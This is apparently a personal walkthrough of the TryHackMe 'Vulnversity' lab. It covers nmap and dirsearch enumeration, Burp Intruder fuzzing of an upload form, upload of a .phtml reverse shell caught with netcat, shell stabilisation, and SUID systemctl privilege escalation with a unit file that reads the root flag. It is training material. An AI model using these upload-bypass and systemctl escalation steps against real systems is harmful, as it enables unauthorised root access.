# **[Vulnversity](https://tryhackme.com/room/vulnversity)**

<br />

> Evan Diamantidis | June 13th, 2022

<br />

# Table of contents

### [1. Enumeration](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Vulnversity#1-enumeration-1)

### [2. Web server directory discovery & fuzzing](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Vulnversity#2-web-server-directory-discovery--fuzzing-1)

### [3. Privilege escalation](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Vulnversity#3-privilege-escalation-1)

<br />
<br />

## 1. Enumeration

<br />

As the first step in our enumeration process we will be gathering some information about the target system using `nmap`. The command used should ideally include options that will provide answers to most, if not all, questions under the Reconnaissance task.

```
# Nmap 7.92 scan initiated Mon Jun 13 08:55:52 2022 as: nmap -sC -sV -sS -n -T5 -oN nmap/initial -p- 10.10.46.142
Nmap scan report for 10.10.46.142
Host is up (0.011s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m01s, deviation: 2h18m33s, median: 1s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2022-06-13T03:56:26-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-06-13T07:56:26
|_  start_date: N/A
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 13 08:56:29 2022 -- 1 IP address (1 host up) scanned in 37.23 seconds
```

<br />

Information about the open ports listed below:

- 21/ftp - vsftpd 3.0.3

- 22/ssh - OpenSSH 7.2p2 Ubuntu

- 139/netbios-ssn - Samba smbd 3.X - 4.X

- 445/netbios-ssn - Samba smbd 4.3.11-Ubuntu

- 3128/http-proxy - Squid http proxy 3.5.12

- 3333/http - Apache httpd 2.4.18 Ubuntu

<br />
<br />


## 2. Web server directory discovery & fuzzing

<br />

Now that we know which port the http server is running on, the next step is to identify hidden directories. We will be using `dirsearch` for this task, however you can proceed with `gobuster`, as per the task instructions.

Either way, we should ensure we are using the correct port for this step, as the web server is not running on a default one on this box.

```
─root@kali ~  
╰─➤  dirsearch -u http://10.10.46.142:3333 -e php           

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 8940

Output File: /root/.dirsearch/reports/10.10.46.142-3333/_22-06-13_09-22-53.txt

Error Log: /root/.dirsearch/logs/errors-22-06-13_09-22-53.log

Target: http://10.10.46.142:3333/

[09:22:53] Starting: 
[09:22:54] 403 -  300B  - /.ht_wsr.txt                                     
[09:22:54] 403 -  303B  - /.htaccess.bak1                                  
[09:22:54] 403 -  305B  - /.htaccess.sample
[09:22:54] 403 -  303B  - /.htaccess_orig
[09:22:54] 403 -  301B  - /.htaccessOLD
[09:22:54] 403 -  304B  - /.htaccess_extra
[09:22:54] 403 -  303B  - /.htaccess.save
[09:22:54] 403 -  301B  - /.htaccess_sc
[09:22:54] 403 -  301B  - /.htaccessBAK
[09:22:54] 403 -  302B  - /.htaccessOLD2
[09:22:54] 403 -  294B  - /.html
[09:22:54] 403 -  293B  - /.htm                                            
[09:22:54] 403 -  299B  - /.htpasswds
[09:22:54] 403 -  303B  - /.htpasswd_test
[09:22:54] 403 -  300B  - /.httr-oauth
[09:22:55] 403 -  293B  - /.php                                            
[09:22:55] 403 -  294B  - /.php3                                           
[09:22:55] 403 -  303B  - /.htaccess.orig                                   
[09:23:07] 301 -  317B  - /css  ->  http://10.10.46.142:3333/css/           
[09:23:10] 301 -  319B  - /fonts  ->  http://10.10.46.142:3333/fonts/       
[09:23:12] 301 -  320B  - /images  ->  http://10.10.46.142:3333/images/     
[09:23:12] 200 -    7KB - /images/                                          
[09:23:12] 200 -   32KB - /index.html                                       
[09:23:13] 301 -  322B  - /internal  ->  http://10.10.46.142:3333/internal/ 
[09:23:13] 200 -    5KB - /js/                                              
[09:23:13] 301 -  316B  - /js  ->  http://10.10.46.142:3333/js/             
[09:23:23] 403 -  302B  - /server-status                                    
[09:23:23] 403 -  303B  - /server-status/                                   
                                                                             
Task Completed
```

<br />

Going through the directory results on our browser we notice that the `/internal/` one in specific has a file upload form that we can use, however attempting to upload a `.php` reverse shell does not seem to work. Same goes for more common file types, such as `.jpg` or `.png` - A good indicator that fuzzing the form with Burp Suite might prove more fruitful.

Let's capture any file upload request using the BurpSuite proxy and then send the response to Intruder so we can test common file extensions. The Sniper attack type is the most efficient, as it will save us some time by automating the check against the upload form. First, we need to specify the payload position on the form that will be used to test the extensions:

![image](https://user-images.githubusercontent.com/14150485/173318171-9c0d7aaa-23b1-41bf-8f29-caf8ecd9f125.png)

<br />

Under Payloads, we choose the wordlist Sniper will iterate through, as well as ensure that URL-encoding is disabled. This is a common file extension check, for the purposes of which I used `extensions-most-common.fuzz.txt`, part of the [SecLists](https://github.com/danielmiessler/SecLists) wordlist suite.

![image](https://user-images.githubusercontent.com/14150485/173319810-2d9f1f8e-5e47-40f5-8afd-12dacd63acc0.png)

<br />

The results will all return a `200` status code which is to be expected, seeing as there is a valid server response, however that is not of much use for our purposes - The response length however is definitely a useful pointer:

![image](https://user-images.githubusercontent.com/14150485/173316855-b14d9a13-de8c-448c-949f-19112f627b9a.png)

The `.phtml` request has a smaller response length, reason being there is no error returned, and should therefore be an allowed file extension on the target server.

Download the reverse shell as instructed on the task, edit the local IP and port values and save the file with a `.phtml` extension before uploading it using the form.

<br />
<br />

## 3. Privilege escalation

<br />

We start a `netcat` listener on our local machine using the port number specified on the reverse shell script.

```
╭─root@kali ~  
╰─➤  nc -lvnp 4524
listening on [any] 4524 ...
```

<br />

The script file we uploaded on the target machine is located under the `/internal/uploads` folder:

```
http://TARGET_IP:TARGET_PORT/internal/uploads/
```

<br />

Executing the file establishes a connection with the machine.

```
╭─root@kali ~  
╰─➤  nc -lvnp 4524
listening on [any] 4524 ...
connect to [LOCAL_IP] from (UNKNOWN) [10.10.46.142] 42416
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 05:30:19 up  1:55,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

<br />

Although not mandatory, my preference is to stabilize shells when possible to avoid accidental loss of access. The target machine seems to have `python` installed which makes this easy for us.

On the target machine, we run the following command:

```
python -c "import pty; pty.spawn('/bin/bash')"
```

<br />

Then put it in the background, which will briefly return us to our local shell:

```
Ctrl + Z
```

<br />

Input the following command locally:

```
stty raw -echo && fg
```

<br />

This should bring us back to the reverse shell where we enter the final command:

```
export TERM=xterm-256-color
```

<br />

Now that we have a stabilized shell, our next step is to check the `/home` directory for any hints or pointers.

```
www-data@vulnuniversity:/$ cd /home
www-data@vulnuniversity:/home$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Jul 31  2019 .
drwxr-xr-x 23 root root 4096 Jul 31  2019 ..
drwxr-xr-x  2 bill bill 4096 Jul 31  2019 bill
```

<br />

There is only one user folder we can list, which we also have access to.

```
www-data@vulnuniversity:/home$ cd bill
www-data@vulnuniversity:/home/bill$ ls -la
total 24
drwxr-xr-x 2 bill bill 4096 Jul 31  2019 .
drwxr-xr-x 3 root root 4096 Jul 31  2019 ..
-rw-r--r-- 1 bill bill  220 Jul 31  2019 .bash_logout
-rw-r--r-- 1 bill bill 3771 Jul 31  2019 .bashrc
-rw-r--r-- 1 bill bill  655 Jul 31  2019 .profile
-rw-r--r-- 1 bill bill   33 Jul 31  2019 user.txt
```

<br />

The flag can be found in the `user.txt` file.

<br />

One of the most useful pieces of information for the purposes of privilege escalation that we should always prioritize is searching for files with `/4000` permissions, also known as `SUID` files.

```
www-data@vulnuniversity:/home/bill$ find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null          
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 76408 Jul 17  2019 /usr/lib/squid/pinger
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 35600 Mar  6  2017 /sbin/mount.cifs
```

<br />

Looking through the list, the `/bin/systemctl` stands out, as it is a command responsible for examining and controlling the `systemd` system and service manager. In `systemd` services are referred to as `units`, which serve as resources the system administrates via the corresponding `unit files`.

Researching this command on [GTFOBins](https://gtfobins.github.io/) we find a reference to an [exploit](https://gtfobins.github.io/gtfobins/systemctl/) that we can use when `systemctl` has `SUID` permissions.

Our attack vector then is to create a `unit file` which `systemctl` will start for us so we can view the flag included in `/root/root.txt` that we have no direct access to with our current permissions.

Let's start by creating the variable:

```
www-data@vulnuniversity:/home/bill$ vuln=$(mktemp).service
```

<br />

Then populating it with the contents of the exploit, changing the shell command piece to display the contents of the flag file:

```
www-data@vulnuniversity:/home/bill$ echo '[Service]
> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
> [Install]
> WantedBy=multi-user.target' > $vuln
```

<br />

We have now created a `unit file` that will read the contents of `/root/root.txt` and export them to the `/tmp/output` file. The remaining steps according to the exploit is to link the `unit file` with `systemctl` and start it.

```
www-data@vulnuniversity:/home/bill$ systemctl link $vuln
Created symlink from /etc/systemd/system/tmp.74hJvCHt6u.service to /tmp/tmp.74hJvCHt6u.service.
www-data@vulnuniversity:/home/bill$ systemctl enable --now $vuln
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.74hJvCHt6u.service to /tmp/tmp.74hJvCHt6u.service.
```

<br />

Looks like the exploit worked and the `/tmp/output` file has indeed been created:

```
www-data@vulnuniversity:/home/bill$ ls -la /tmp
total 40
drwxrwxrwt  8 root     root     4096 Jun 13 06:12 .
drwxr-xr-x 23 root     root     4096 Jul 31  2019 ..
drwxrwxrwt  2 root     root     4096 Jun 13 03:35 .ICE-unix
drwxrwxrwt  2 root     root     4096 Jun 13 03:35 .Test-unix
drwxrwxrwt  2 root     root     4096 Jun 13 03:35 .X11-unix
drwxrwxrwt  2 root     root     4096 Jun 13 03:35 .XIM-unix
drwxrwxrwt  2 root     root     4096 Jun 13 03:35 .font-unix
-rw-r--r--  1 root     root       33 Jun 13 06:12 output
drwx------  3 root     root     4096 Jun 13 03:35 systemd-private-9d4c6fdc98ad4682889d40fb7a837b37-systemd-timesyncd.service-SGEtU4
-rw-------  1 www-data www-data    0 Jun 13 06:08 tmp.74hJvCHt6u
-rw-rw-rw-  1 www-data www-data  103 Jun 13 06:09 tmp.74hJvCHt6u.service
```

<br />

The contents of which print the `/root/root.txt` flag for us:

```
www-data@vulnuniversity:/home/bill$ cat /tmp/output 
a58ff**********************c7fd5
```

<br />

Congrats, you just pwned Vulnversity!

<br />
